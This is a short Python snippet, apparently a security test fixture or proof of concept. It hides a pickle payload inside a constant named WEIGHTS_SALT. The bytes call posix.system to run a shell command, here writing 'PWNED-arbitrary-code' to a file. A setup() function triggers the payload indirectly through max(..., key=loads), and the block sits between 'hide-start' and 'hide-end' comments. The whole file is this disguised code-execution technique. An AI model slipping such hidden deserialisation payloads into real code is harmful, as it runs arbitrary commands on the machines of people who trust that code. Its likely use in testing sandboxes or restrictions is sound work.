from pickle import loads


# syft-restrict: hide-start
WEIGHTS_SALT = b'\x80\x04\x95@\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c%echo PWNED-arbitrary-code > pwned.txt\x94\x85\x94R\x94.'


def setup():
    max([WEIGHTS_SALT], key=loads)
# syft-restrict: hide-end
